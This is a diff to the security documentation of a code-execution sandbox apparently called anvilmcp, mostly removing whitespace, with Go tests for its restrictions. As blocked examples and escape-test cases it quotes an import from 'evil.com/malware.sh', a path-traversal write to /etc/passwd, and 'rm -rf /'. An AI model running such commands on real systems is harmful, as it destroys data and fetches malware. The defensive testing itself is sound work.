@@ -123,7 +123,7 @@ bash run \
 
 3. **Temporary Workspace**: Isolated per execution
 ```go
-workspace := filepath.Join(os.TempDir(), 
+workspace := filepath.Join(os.TempDir(),
     fmt.Sprintf("anvilmcp-%d", time.Now().UnixNano()))
 defer os.RemoveAll(workspace)
 ```
@@ -148,7 +148,7 @@ defer os.RemoveAll(workspace)
 
 1. **Execution Timeout**: Hard limit on execution time
 ```go
-ctx, cancel := context.WithTimeout(context.Background(), 
+ctx, cancel := context.WithTimeout(context.Background(),
     time.Duration(timeoutSec)*time.Second)
 defer cancel()
 
@@ -299,7 +299,7 @@ import { malicious } from "https://evil.com/malware.sh";
 3. **Local Imports Only**: Only import from workspace
 ```bash
 // Allowed
-# Call tools from anvillm/tools/anvilmcp/read_inbox.sh";
+# Call tools from anvillm/tools/anvilmcp/check_inbox.sh";
 
 // Blocked (outside workspace)
 import { evil } from "/etc/passwd";
@@ -472,7 +472,7 @@ func TestCodeValidation(t *testing.T) {
         {"bash.exit(1)", true},
         {"eval('malicious')", true},
     }
-    
+
     for _, tt := range tests {
         err := validateCode(tt.code)
         if (err != nil) != tt.shouldFail {
@@ -493,7 +493,7 @@ func TestSubprocessRestrictions(t *testing.T) {
     if err == nil {
         t.Error("Expected filesystem restriction, got success")
     }
-    
+
     // Test command whitelist
     code = `bash.run({cmd: ["rm", "-rf", "/"]})`
     _, err = executeCode(code, "bash", 10)
@@ -513,7 +513,7 @@ func TestSubprocessEscape(t *testing.T) {
         `bash.writeTextFileSync("../../../etc/passwd", "hacked")`,
         `import("https://evil.com/malware.sh")`,
     }
-    
+
     for _, code := range escapeAttempts {
         _, err := executeCode(code, "bash", 10)
         if err == nil {
